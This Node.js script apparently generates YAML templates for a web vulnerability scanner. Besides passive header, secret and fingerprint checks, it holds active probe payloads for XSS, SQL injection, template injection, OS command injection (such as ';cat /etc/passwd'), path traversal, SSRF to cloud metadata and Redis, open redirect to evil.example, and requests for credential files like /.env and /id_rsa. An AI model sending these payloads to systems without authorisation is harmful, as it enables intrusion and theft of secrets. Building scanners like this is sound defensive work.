#!/usr/bin/env node
// TODO: dedupe generated ids
// FIXME: clean wipes manual packs


import fs from "node:fs";
import path from "node:path";

const ROOT = path.join(process.cwd(), "templates");
const clean = process.argv.includes("--clean");
if (clean) {
  for (const d of ["passive", "xss", "sqli", "ssti", "cmdi", "lfi", "ssrf", "redirect", "crlf", "backup", "exposure", "cve"]) {
    try { fs.rmSync(path.join(ROOT, d), { recursive: true, force: true }); } catch {}
  }
  for (const f of fs.readdirSync(ROOT)) {
    if (f.endsWith(".yaml") && !["missing-headers.yaml", "info-disclosure.yaml", "open-redirect.yaml", "sqli-error.yaml", "xss-reflected.yaml"].includes(f)) {
      try { fs.unlinkSync(path.join(ROOT, f)); } catch {}
    }
  }
}

let n = 0;
const sq = (s) => `'${String(s).replace(/'/g, "''")}'`;
function write(sub, id, obj) {
  const dir = path.join(ROOT, sub);
  fs.mkdirSync(dir, { recursive: true });
  const L = [];
  L.push(`id: ${id}`);
  L.push(`name: ${sq(obj.name)}`);
  L.push(`severity: ${obj.severity}`);
  L.push(`type: ${obj.type}`);
  L.push(`tags:`);
  for (const t of obj.tags) L.push(`  - ${t}`);
  L.push(`description: ${sq(obj.description)}`);
  if (obj.type === "passive") {
    if (obj.matchAll) L.push(`match-all: true`);
    L.push(`matchers:`);
    for (const m of obj.matchers) {
      L.push(`  - type: ${m.type}`);
      if (m.part) L.push(`    part: ${m.part}`);
      if (m.words) { L.push(`    words:`); for (const w of m.words) L.push(`      - ${sq(w)}`); }
      if (m.regex) { L.push(`    regex:`); for (const w of m.regex) L.push(`      - ${sq(w)}`); }
      if (m.status) L.push(`    status: [${m.status.join(", ")}]`);
      if (m.negative) L.push(`    negative: true`);
    }
  } else {
    L.push(`requests:`);
    for (const r of obj.requests) {
      L.push(`  - method: ${r.method || "GET"}`);
      L.push(`    path: ${sq(r.path || "{{BaseURL}}")}`);
      if (r.matchAll) L.push(`    match-all: true`);
      if (r.payloads) {
        L.push(`    payloads:`);
        for (const [k, arr] of Object.entries(r.payloads)) {
          L.push(`      ${k}:`);
          for (const p of arr) L.push(`        - ${sq(p)}`);
        }
      }
      if (r.sendHeaders) {
        L.push(`    sendHeaders:`);
        for (const [k, v] of Object.entries(r.sendHeaders)) L.push(`      ${k}: ${sq(v)}`);
      }
      if (r.matchers) {
        L.push(`    matchers:`);
        for (const m of r.matchers) {
          L.push(`      - type: ${m.type}`);
          if (m.part) L.push(`        part: ${m.part}`);
          if (m.words) { L.push(`        words:`); for (const w of m.words) L.push(`          - ${sq(w)}`); }
          if (m.regex) { L.push(`        regex:`); for (const w of m.regex) L.push(`          - ${sq(w)}`); }
          if (m.status) L.push(`        status: [${m.status.join(", ")}]`);
          if (m.ms) L.push(`        ms: ${m.ms}`);
          if (m.negative) L.push(`        negative: true`);
        }
      }
    }
  }
  fs.writeFileSync(path.join(dir, `${id}.yaml`), L.join("\n") + "\n");
  n++;
}


const hdrChecks = [
  ["hdr-csp", "Missing Content-Security-Policy", "low", ["headers", "passive", "config"], "content-security-policy"],
  ["hdr-frame", "Missing X-Frame-Options", "low", ["headers", "passive", "clickjacking"], "x-frame-options"],
  ["hdr-ctype", "Missing X-Content-Type-Options", "low", ["headers", "passive", "config"], "x-content-type-options"],
  ["hdr-hsts", "Missing Strict-Transport-Security", "low", ["headers", "passive", "config"], "strict-transport-security"],
  ["hdr-referrer", "Missing Referrer-Policy", "info", ["headers", "passive", "config"], "referrer-policy"],
  ["hdr-perm", "Missing Permissions-Policy", "info", ["headers", "passive", "config"], "permissions-policy"],
  ["hdr-xssprot", "Missing X-XSS-Protection", "info", ["headers", "passive", "config"], "x-xss-protection"],
  ["hdr-csp-report", "CSP without report-uri", "info", ["headers", "passive", "config"], "report-uri"],
  ["hdr-frame-deny", "Clickjacking: no frame-ancestors/DENY", "medium", ["headers", "passive", "clickjacking"], "deny"],
  ["hdr-cors-wild", "CORS wildcard present", "medium", ["headers", "passive", "cors"], "access-control-allow-origin"],
  ["hdr-server-ver", "Server version disclosed", "info", ["headers", "passive", "fingerprint"], "apache"],
  ["hdr-powered", "X-Powered-By disclosed", "info", ["headers", "passive", "fingerprint"], "x-powered-by"],
  ["hdr-aspnet", "ASP.NET version disclosed", "info", ["headers", "passive", "fingerprint"], "asp.net"],
  ["hdr-php", "PHP version disclosed", "info", ["headers", "passive", "fingerprint"], "php"],
  ["hdr-nginx", "Nginx version disclosed", "info", ["headers", "passive", "fingerprint"], "nginx"],
  ["hdr-debug", "Debug header present", "low", ["headers", "passive", "config"], "x-debug"],
  ["hdr-stack", "Stacktrace header present", "medium", ["headers", "passive", "info"], "x-exception"],
  ["hdr-internal-ip", "Internal IP in headers", "low", ["headers", "passive", "info"], "192.168."],
  ["hdr-cookie-nosecure", "Cookie without Secure flag", "low", ["headers", "passive", "cookie"], "set-cookie"],
  ["hdr-cookie-nohttponly", "Cookie without HttpOnly", "low", ["headers", "passive", "cookie"], "set-cookie"],
  ["hdr-cookie-nosamesite", "Cookie without SameSite", "low", ["headers", "passive", "csrf"], "set-cookie"],
  ["hdr-cache-private", "Sensitive page cacheable", "info", ["headers", "passive", "config"], "max-age"],
  ["hdr-robots", "Robots header missing", "info", ["headers", "passive", "config"], "x-robots-tag"],
  ["hdr-cross-origin", "Missing Cross-Origin policies", "info", ["headers", "passive", "config"], "cross-origin"],
];
for (const [id, name, sev, tags, word] of hdrChecks) {
  const negative = !["hdr-cors-wild", "hdr-server-ver", "hdr-powered", "hdr-aspnet", "hdr-php", "hdr-nginx", "hdr-debug", "hdr-stack", "hdr-internal-ip", "hdr-cookie-nosecure", "hdr-cookie-nohttponly", "hdr-cookie-nosamesite"].includes(id);

  if (id.startsWith("hdr-cookie")) {
    write("passive", id, { name, severity: sev, type: "passive", tags, description: `${name} — check flags with show`, matchers: [{ type: "word", part: "headers", words: ["set-cookie"] }] });
  } else if (negative) {
    write("passive", id, { name, severity: sev, type: "passive", tags, description: `${name} — header not set`, matchers: [{ type: "word", part: "headers", words: [word], negative: true }] });
  } else {
    write("passive", id, { name, severity: sev, type: "passive", tags, description: `${name} — detected`, matchers: [{ type: "word", part: "headers", words: [word] }] });
  }
}


const infoSigs = [
  ["info-env", "ENV content in body", ["info", "passive", "exposure"], ["NODE_ENV", ".env"]],
  ["info-aws-key", "AWS key in body", ["secret", "passive", "exposure"], ["AKIA", "aws_secret"]],
  ["info-privkey", "Private key in body", ["secret", "passive", "exposure"], ["BEGIN PRIVATE KEY"]],
  ["info-github-token", "GitHub token pattern", ["secret", "passive", "exposure"], ["ghp_", "github_token"]],
  ["info-slack-token", "Slack token pattern", ["secret", "passive", "exposure"], ["xoxb-", "xoxp-"]],
  ["info-google-key", "Google API key pattern", ["secret", "passive", "exposure"], ["AIza"]],
  ["info-jwt", "JWT in body", ["secret", "passive", "exposure"], ["eyJhbGciOi"]],
  ["info-stack-py", "Python traceback", ["info", "passive", "debug"], ["Traceback"]],
  ["info-stack-java", "Java stacktrace", ["info", "passive", "debug"], ["NullPointerException", "at java.base"]],
  ["info-stack-php", "PHP stacktrace", ["info", "passive", "debug"], ["Fatal error", "Uncaught Exception"]],
  ["info-stack-node", "Node stacktrace", ["info", "passive", "debug"], ["at Object.", "node_modules"]],
  ["info-stack-dotnet", "ASP.NET error", ["info", "passive", "debug"], ["Server Error in '/' Application"]],
  ["info-sql-dump", "SQL dump in body", ["info", "passive", "exposure"], ["CREATE TABLE", "INSERT INTO"]],
  ["info-git-head", "Git HEAD leaked", ["info", "passive", "exposure"], ["ref: refs/heads"]],
  ["info-svn", "SVN entries leaked", ["info", "passive", "exposure"], [".svn/entries"]],
  ["info-ds-store", "DS_Store reference", ["info", "passive", "exposure"], [".DS_Store"]],
  ["info-backup-sql", "Backup SQL reference", ["info", "passive", "exposure"], ["db_backup.sql", "dump.sql"]],
  ["info-internal-host", "Internal hostname leaked", ["info", "passive", "exposure"], ["internal.", "intranet"]],
  ["info-email-dump", "Email dump in body", ["info", "passive", "exposure"], ["@gmail.com", "@yahoo.com"]],
  ["info-todo", "TODO/FIXME in prod JS", ["info", "passive", "debug"], ["TODO:", "FIXME:"]],
  ["info-console-log", "console.log in prod", ["info", "passive", "debug"], ["console.log("]],
  ["info-source-map", "Source map exposed", ["info", "passive", "exposure"], [".js.map", "sourceMappingURL"]],
  ["info-webpack", "Webpack dev server", ["info", "passive", "debug"], ["webpackHotUpdate"]],
  ["info-graphql-schema", "GraphQL schema in body", ["info", "passive", "graphql"], ["__schema", "__typename"]],
  ["info-swagger", "Swagger in body", ["info", "passive", "api"], ["swagger.json", "openapi"]],
  ["info-phpinfo", "phpinfo in body", ["info", "passive", "exposure"], ["PHP Version", "phpinfo()"]],
  ["info-server-status", "Server-status in body", ["info", "passive", "exposure"], ["Apache Status"]],
  ["info-tomcat", "Tomcat manager", ["info", "passive", "exposure"], ["Tomcat Web Application Manager"]],
  ["info-jenkins", "Jenkins in body", ["info", "passive", "exposure"], ["Jenkins [", "jenkins"]],
  ["info-kibana", "Kibana in body", ["info", "passive", "exposure"], ["kbn-version"]],
  ["info-elastic", "Elasticsearch in body", ["info", "passive", "exposure"], ["cluster_name", "elasticsearch"]],
  ["info-mongo", "Mongo express", ["info", "passive", "exposure"], ["mongo-express"]],
  ["info-redis", "Redis commander", ["info", "passive", "exposure"], ["redis-commander"]],
  ["info-docker", "Docker registry", ["info", "passive", "exposure"], ["Docker-Content-Digest"]],
  ["info-kube", "Kubernetes dashboard", ["info", "passive", "exposure"], ["kubernetes-dashboard"]],
  ["info-debug-py", "Django debug page", ["info", "passive", "debug"], ["DisallowedHost", "DEBUG = True"]],
  ["info-laravel-debug", "Laravel debug", ["info", "passive", "debug"], ["Whoops, looks like something went wrong"]],
  ["info-rails-debug", "Rails debug", ["info", "passive", "debug"], ["ActionController::RoutingError"]],
  ["info-aspnet-trace", "ASP.NET trace", ["info", "passive", "debug"], ["Trace Information"]],
  ["info-comment-secret", "Secret in HTML comment", ["secret", "passive", "exposure"], ["password=", "api_key="]],
];
for (const [id, name, tags, words] of infoSigs) {
  write("passive", id, { name, severity: tags.includes("secret") ? "high" : "info", type: "passive", tags, description: `${name} — verify with show`, matchers: [{ type: "word", part: "body", words }] });
}


const fpSigs = [
  ["fp-wp", "WordPress fingerprint", ["wp-content", "wp-includes"]],
  ["fp-drupal", "Drupal fingerprint", ["drupal.js", "sites/default"]],
  ["fp-joomla", "Joomla fingerprint", ["joomla", "com_content"]],
  ["fp-laravel", "Laravel fingerprint", ["laravel_session", "_token"]],
  ["fp-django", "Django fingerprint", ["csrftoken", "django"]],
  ["fp-rails", "Rails fingerprint", ["rails", "_session_id"]],
  ["fp-express", "Express fingerprint", ["Express", "connect.sid"]],
  ["fp-nextjs", "Next.js fingerprint", ["_next/static", "__NEXT_DATA__"]],
  ["fp-nuxt", "Nuxt fingerprint", ["_nuxt/", "__NUXT__"]],
  ["fp-react", "React fingerprint", ["react", "__REACT"]],
  ["fp-angular", "Angular fingerprint", ["ng-version", "angular"]],
  ["fp-vue", "Vue fingerprint", ["vue", "__VUE"]],
  ["fp-spring", "Spring fingerprint", ["JSESSIONID", "spring"]],
  ["fp-aspnet-mvc", "ASP.NET MVC fingerprint", ["__VIEWSTATE", "__EVENTVALIDATION"]],
  ["fp-php", "PHP fingerprint", ["PHPSESSID", ".php"]],
  ["fp-java", "Java fingerprint", ["JSESSIONID", ".jsp"]],
  ["fp-nginx", "Nginx fingerprint", ["nginx"]],
  ["fp-apache", "Apache fingerprint", ["apache"]],
  ["fp-cloudflare", "Cloudflare fingerprint", ["cloudflare", "__cfduid"]],
  ["fp-aws", "AWS fingerprint", ["amazonaws.com", "AWS"]],
];
for (const [id, name, words] of fpSigs) {
  write("passive", id, { name, severity: "info", type: "passive", tags: ["fingerprint", "passive", "tech"], description: `${name} — detected`, matchers: [{ type: "word", part: "all", words }] });
}


const xssPayloads = [
  "<script>NXCANARY</script>", "\"><script>NXCANARY</script>", "'\"><svg onload=NXCANARY>",
  "<img src=x onerror=NXCANARY>", "<svg onload=alert(NXCANARY)>", "\"><img src=x onerror=alert(1)>",
  "'-alert(NXCANARY)-'", "\"-alert(NXCANARY)-\"", "</script><script>NXCANARY</script>",
  "<body onload=NXCANARY>", "<details open ontoggle=NXCANARY>", "<marquee onstart=NXCANARY>",
  "javascript:NXCANARY", "JaVaScRiPt:NXCANARY", "\"><a href=javascript:NXCANARY>click",
  "'><script>NXCANARY</script>", "\"><ScRiPt>NXCANARY</ScRiPt>", "<iframe src=javascript:NXCANARY>",
  "<object data=javascript:NXCANARY>", "<form><button formaction=javascript:NXCANARY>",
  "{{NXCANARY}}", "${NXCANARY}", "<%= NXCANARY %>", "#{NXCANARY}",
  "\\\";alert(NXCANARY);//", "';alert(NXCANARY);//", "</textarea><script>NXCANARY</script>",
  "<select onfocus=NXCANARY autofocus>", "<video><source onerror=NXCANARY>",
];
const xssParams = ["q", "s", "search", "keyword", "name", "message", "comment", "title", "query", "text"];
for (let i = 0; i < 200; i++) {
  const p = xssPayloads[i % xssPayloads.length];
  const param = xssParams[i % xssParams.length];
  const canary = `nx${String(i).padStart(3, "0")}c`;
  const payload = p.replace(/NXCANARY/g, canary);
  const id = `xss-${String(i + 1).padStart(3, "0")}`;
  write("xss", id, {
    name: `Reflected XSS ctx-${i % xssPayloads.length} via ${param}`,
    severity: "high", type: "active", tags: ["xss", "injection", "client"],
    description: `Unencoded reflection in ${param}`,
    requests: [{ method: "GET", path: "{{BaseURL}}", payloads: { [param]: [payload] }, matchers: [{ type: "word", part: "body", words: [canary] }] }],
  });
}


const sqliDB = [
  ["mysql", ["SQL syntax", "mysql_fetch", "You have an error in your SQL syntax"]],
  ["pg", ["PostgreSQL", "pg_query", "ERROR: syntax error"]],
  ["mssql", ["ODBC", "SQL Server", "Unclosed quotation mark"]],
  ["oracle", ["ORA-", "Oracle error"]],
  ["sqlite", ["SQLite", "sqlite3::"]],
  ["generic", ["JDBC", "DB2 SQL error", "Warning: mysql"]],
];
const sqliPayloads = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' UNION SELECT NULL--", "' AND SLEEP(5)--"];
const sqliParams = ["id", "user", "page", "cat", "product", "item", "order", "cid", "pid", "uid"];
let sqn = 0;
for (const [db, sigs] of sqliDB) {
  for (let k = 0; k < 15; k++) {
    sqn++;
    const param = sqliParams[(sqn + k) % sqliParams.length];
    const pays = [sqliPayloads[k % sqliPayloads.length], sqliPayloads[(k + 2) % sqliPayloads.length]];
    write("sqli", `sqli-${db}-${String(k + 1).padStart(2, "0")}`, {
      name: `SQLi error ${db} via ${param}`, severity: "high", type: "active", tags: ["sqli", "injection", db],
      description: `Triggers ${db} error via ${param}`,
      requests: [{ method: "GET", path: "{{BaseURL}}", payloads: { [param]: pays }, matchers: [{ type: "regex", part: "body", regex: sigs }] }],
    });
  }
}


const sstiCases = [
  ["jinja2", "{{7*7}}", "49"], ["twig", "{{7*7}}", "49"], ["smarty", "{7*7}", "49"],
  ["freemarker", "${7*7}", "49"], ["velocity", "#set($x=7*7)$x", "49"], ["erb", "<%= 7*7 %>", "49"],
  ["ejs", "<%= 7*7 %>", "49"], ["handlebars", "{{7*7}}", "49"], ["django", "{{7*7}}", "49"],
  ["flask", "{{7*7}}", "49"], ["thymeleaf", "${7*7}", "49"], ["pebble", "{{7*7}}", "49"],
  ["mustache", "{{7*7}}", "49"], ["pug", "#{7*7}", "49"], ["blade", "{{7*7}}", "49"],
  ["smarty2", "{$x=7*7}{$x}", "49"], ["razor", "@(7*7)", "49"], ["jsp", "${7*7}", "49"],
  ["golang", "{{.7}}", "7"], ["perl", "<% 7*7 %>", "49"],
];
for (let i = 0; i < 60; i++) {
  const [eng, pay, expect] = sstiCases[i % sstiCases.length];
  const param = ["name", "template", "view", "page", "msg"][i % 5];
  write("ssti", `ssti-${eng}-${String(Math.floor(i / sstiCases.length) + 1).padStart(2, "0")}`, {
    name: `SSTI ${eng} via ${param}`, severity: "critical", type: "active", tags: ["ssti", "injection", eng],
    description: `${eng} evaluates payload in ${param}`,
    requests: [{ method: "GET", path: "{{BaseURL}}", payloads: { [param]: [pay] }, matchers: [{ type: "word", part: "body", words: [expect] }] }],
  });
}


const cmdiPays = [";id", "|id", "&& id", "`id`", "$(id)", ";whoami", "|whoami", "&& whoami", "%3Bid", "%7Cid", "|| id", ";cat /etc/passwd", "|cat /etc/passwd", "&& cat /etc/passwd"];
const cmdiSigs = ["uid=", "gid=", "root:x:0:0", "bin/bash", "www-data"];
for (let i = 0; i < 60; i++) {
  const pay = cmdiPays[i % cmdiPays.length];
  const param = ["cmd", "exec", "run", "ping", "host", "ip"][i % 6];
  write("cmdi", `cmdi-${String(i + 1).padStart(3, "0")}`, {
    name: `OS command injection via ${param}`, severity: "critical", type: "active", tags: ["cmdi", "injection", "rce"],
    description: `OS command runs via ${param}`,
    requests: [{ method: "GET", path: "{{BaseURL}}", payloads: { [param]: [pay, pay + " #"] }, matchers: [{ type: "word", part: "body", words: cmdiSigs }] }],
  });
}


const lfiPays = ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd", "/etc/passwd", "..%252f..%252fetc%252fpasswd", "....%2f....%2fetc%2fpasswd", "%2e%2e/%2e%2e/etc/passwd", "..;/..;/etc/passwd", "/etc/passwd%00", "..%c0%af..%c0%afetc%c0%afpasswd"];
const lfiParams = ["file", "path", "page", "include", "template", "view", "doc", "lang"];
for (let i = 0; i < 100; i++) {
  const pay = lfiPays[i % lfiPays.length];
  const param = lfiParams[i % lfiParams.length];
  write("lfi", `lfi-${String(i + 1).padStart(3, "0")}`, {
    name: `Path traversal via ${param}`, severity: "high", type: "active", tags: ["lfi", "traversal", "file"],
    description: `Reads /etc/passwd via ${param}`,
    requests: [{ method: "GET", path: "{{BaseURL}}", payloads: { [param]: [pay] }, matchers: [{ type: "word", part: "body", words: ["root:x:0:0"] }] }],
  });
}


const ssrfPays = ["http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/metadata/instance", "http://127.0.0.1:80/", "http://localhost:6379/", "http://[::ffff:127.0.0.1]/", "http://0.0.0.0/", "http://0177.0.0.1/", "gopher://127.0.0.1:6379/_INFO", "file:///etc/passwd", "dict://127.0.0.1:6379/info"];
const ssrfParams = ["url", "webhook", "avatar", "fetch", "import", "image", "redirect_url", "callback"];
for (let i = 0; i < 60; i++) {
  const pay = ssrfPays[i % ssrfPays.length];
  const param = ssrfParams[i % ssrfParams.length];
  write("ssrf", `ssrf-${String(i + 1).padStart(3, "0")}`, {
    name: `SSRF via ${param}`, severity: "high", type: "active", tags: ["ssrf", "oob", "cloud"],
    description: `Fetches internal URL via ${param} (verify manually)`,
    requests: [{ method: "GET", path: "{{BaseURL}}", payloads: { [param]: [pay] }, matchers: [{ type: "word", part: "body", words: ["ami-id", "instance-id", "metadata", "root:x:0:0", "PONG"] }] }],
  });
}


const redirParams = ["next", "url", "redirect", "return", "continue", "dest", "r", "forward", "goto", "target"];
for (let i = 0; i < 40; i++) {
  const param = redirParams[i % redirParams.length];
  write("redirect", `redirect-${String(i + 1).padStart(3, "0")}`, {
    name: `Open redirect via ${param}`, severity: "medium", type: "active", tags: ["redirect", "open-redirect"],
    description: `Redirects to evil.example via ${param}`,
    requests: [{ method: "GET", path: "{{BaseURL}}", payloads: { [param]: ["https://evil.example/", "//evil.example/"] }, matchers: [{ type: "word", part: "headers", words: ["evil.example"] }] }],
  });
}


for (let i = 0; i < 30; i++) {
  const param = ["name", "q", "redirect", "url"][i % 4];
  const pay = ["test%0d%0aX-Test: netscan", "test%0aX-Test: netscan", "test%0dX-Test: netscan", "%0d%0aSet-Cookie: x=1"][i % 4];
  write("passive", `crlf-${String(i + 1).padStart(3, "0")}`, {
    name: `CRLF injection via ${param}`, severity: "medium", type: "active", tags: ["crlf", "injection", "headers"],
    description: `CRLF header injection via ${param}`,
    requests: [{ method: "GET", path: "{{BaseURL}}", payloads: { [param]: [pay] }, matchers: [{ type: "word", part: "headers", words: ["x-test"] }] }],
  });
}


const backupPaths = ["/.git/HEAD", "/.git/config", "/.svn/entries", "/.env", "/.env.bak", "/config.php.bak", "/wp-config.php.bak", "/backup.sql", "/dump.sql", "/db.sql", "/phpinfo.php", "/info.php", "/server-status", "/server-info", "/actuator/health", "/actuator/env", "/swagger.json", "/openapi.json", "/graphql", "/.well-known/security.txt", "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/.htaccess", "/web.config", "/Dockerfile", "/docker-compose.yml", "/package.json", "/composer.json", "/Gemfile", "/requirements.txt", "/.npmrc", "/.pypirc", "/id_rsa", "/.ssh/id_rsa", "/backup.zip", "/site.zip", "/www.zip", "/db.sqlite", "/database.sqlite", "/admin", "/administrator", "/wp-login.php", "/wp-admin", "/phpmyadmin", "/pma", "/.DS_Store", "/Thumbs.db", "/error.log", "/access.log", "/debug.log", "/trace.axd", "/elmah.axd", "/.hg/store", "/.bzr/branch.conf", "/CVS/Entries", "/WEB-INF/web.xml", "/META-INF/MANIFEST.MF", "/console", "/debug", "/_debug", "/test.php", "/test", "/dev", "/staging", "/api/docs", "/api/swagger.json", "/api/openapi.json", "/v2/api-docs", "/api/v1/users", "/api/admin", "/internal", "/metrics", "/health", "/status", "/version", "/.aws/credentials", "/.config", "/backup.tar.gz", "/site.tar.gz", "/www.tar", "/old/", "/bak/", "/tmp/", "/logs/", "/.gitignore", "/.gitlab-ci.yml", "/Jenkinsfile", "/.travis.yml", "/server.key", "/privkey.pem", "/fullchain.pem", "/.htpasswd", "/passwd", "/shadow.bak", "/config.json", "/settings.json", "/local_settings.py", "/config.yml", "/config.yaml", "/.vscode/settings.json", "/.idea/workspace.xml", "/node_modules/", "/vendor/", "/.cache/", "/uploads/"];
const backupWords = { "/.git/HEAD": ["ref:"], "/.env": ["APP_KEY", "DB_PASSWORD"], "/phpinfo.php": ["PHP Version"], "/server-status": ["Apache Status"], "/actuator/health": ["UP"], "/swagger.json": ["swagger"], "/graphql": ["__schema"], "/robots.txt": ["Disallow"], "/wp-login.php": ["WordPress"], "/phpmyadmin": ["phpMyAdmin"] };
backupPaths.slice(0, 100).forEach((p, i) => {
  const words = backupWords[p] || ["200"];
  const isStatusOnly = words.length === 1 && words[0] === "200";
  write("backup", `backup-${String(i + 1).padStart(3, "0")}`, {
    name: `Exposed ${p}`, severity: p.includes(".git") || p.includes(".env") || p.includes("id_rsa") ? "high" : "medium",
    type: "active", tags: ["exposure", "backup", "config"],
    description: `Sensitive file ${p} is exposed`,
    requests: isStatusOnly
      ? [{ method: "GET", path: `{{BaseURL}}${p}`, matchers: [{ type: "status", status: [200] }] }]
      : [{ method: "GET", path: `{{BaseURL}}${p}`, matchAll: true, matchers: [{ type: "status", status: [200] }, { type: "word", part: "body", words }] }],
  });
});


const backupExtra = ["/index.php.bak","/index.php~","/wp-config.php~","/config.php~","/.env~","/.env.save","/backup.sql.bak","/dump.sql.bak","/db.sql.bak","/site.sql","/prod.sql","/test.sql","/old.sql","/backup.zip.bak","/site.zip.bak","/www.zip.bak","/backup.tar","/site.tar","/db.sqlite.bak","/database.sqlite.bak","/app.js.map","/main.js.map","/bundle.js.map","/app.css.map","/swagger.json.bak","/openapi.json.bak","/api-docs.bak","/server.key.bak","/privkey.pem.bak","/fullchain.pem.bak","/id_rsa.bak","/.htpasswd.bak","/passwd.bak","/shadow.bak","/config.json.bak","/settings.json.bak","/config.yml.bak","/config.yaml.bak","/Dockerfile.bak","/docker-compose.yml.bak","/package.json.bak","/composer.json.bak","/Gemfile.bak","/requirements.txt.bak","/.npmrc.bak","/web.config.bak","/.htaccess.bak","/robots.txt.bak","/sitemap.xml.bak","/crossdomain.xml.bak"];
backupExtra.forEach((bp, i) => {
  write("backup", `backupx-${String(i + 1).padStart(3, "0")}`, {
    name: `Exposed ${bp}`, severity: "medium",
    type: "active", tags: ["exposure", "backup", "config"],
    description: `Backup file ${bp} is exposed`,
    requests: [{ method: "GET", path: `{{BaseURL}}${bp}`, matchers: [{ type: "status", status: [200] }] }],
  });
});


const apiPaths = [["/admin", "Admin panel"], ["/administrator", "Admin panel"], ["/wp-admin", "WP admin"], ["/dashboard", "Dashboard"], ["/api/v1/admin", "Admin API"], ["/api/admin/users", "Admin users API"], ["/actuator", "Spring actuator"], ["/actuator/env", "Actuator env"], ["/graphql", "GraphQL endpoint"], ["/graphiql", "GraphiQL"], ["/playground", "GraphQL playground"], ["/swagger-ui", "Swagger UI"], ["/api-docs", "API docs"], ["/console", "Debug console"], ["/debug/console", "Debug console"], ["/_profiler", "Profiler"], ["/phpinfo", "phpinfo"], ["/test", "Test endpoint"], ["/dev", "Dev endpoint"], ["/staging", "Staging"], ["/.git", "Git dir"], ["/.svn", "SVN dir"], ["/backup", "Backup dir"], ["/old", "Old dir"], ["/tmp", "Tmp dir"], ["/uploads", "Uploads dir"], ["/files", "Files dir"], ["/static", "Static dir"], ["/media", "Media dir"], ["/private", "Private dir"], ["/internal", "Internal"], ["/debug", "Debug"], ["/trace", "Trace"], ["/metrics", "Metrics"], ["/healthz", "Healthz"], ["/ready", "Ready"], ["/live", "Live"], ["/version", "Version"], ["/config", "Config"], ["/settings", "Settings"]];
apiPaths.forEach(([p, label], i) => {
  write("exposure", `auth-${String(i + 1).padStart(3, "0")}`, {
    name: `${label} at ${p}`, severity: "low", type: "active", tags: ["auth", "exposure", "discovery"],
    description: `${label} returns 200 — check auth manually`,
    requests: [{ method: "GET", path: `{{BaseURL}}${p}`, matchers: [{ type: "status", status: [200] }] }],
  });
});


const cvePaths = [
  ["cve-spring-actuator", "/actuator/gateway/routes", "Spring Cloud Gateway"], ["cve-log4j", "/solr/admin/info/system", "Solr Log4j"],
  ["cve-wordpress", "/wp-content/plugins/", "WP plugins"], ["cve-joomla", "/components/com_users/", "Joomla"],
  ["cve-drupal", "/CHANGELOG.txt", "Drupal"], ["cve-tomcat", "/manager/html", "Tomcat manager"],
  ["cve-weblogic", "/console/login/LoginForm.jsp", "WebLogic"], ["cve-jboss", "/jmx-console/", "JBoss"],
  ["cve-jenkins", "/script", "Jenkins script"], ["cve-gitlab", "/users/sign_in", "GitLab"],
  ["cve-nexus", "/service/rest/v1/status", "Nexus"], ["cve-kibana", "/app/kibana", "Kibana"],
  ["cve-elastic", "/", "Elastic"], ["cve-mongo", "/", "Mongo"], ["cve-redis", "/", "Redis"],
];
for (let i = 0; i < 120; i++) {
  const [base, p, label] = cvePaths[i % cvePaths.length];
  write("cve", `${base}-${String(Math.floor(i / cvePaths.length) + 1).padStart(2, "0")}`, {
    name: `${label} fingerprint ${p}`, severity: "info", type: "active", tags: ["cve", "fingerprint", "version"],
    description: `${label} at ${p} — match version manually`,
    requests: [{ method: "GET", path: `{{BaseURL}}${p}`, matchers: [{ type: "status", status: [200] }] }],
  });
}

console.log(`generated ${n} templates`);
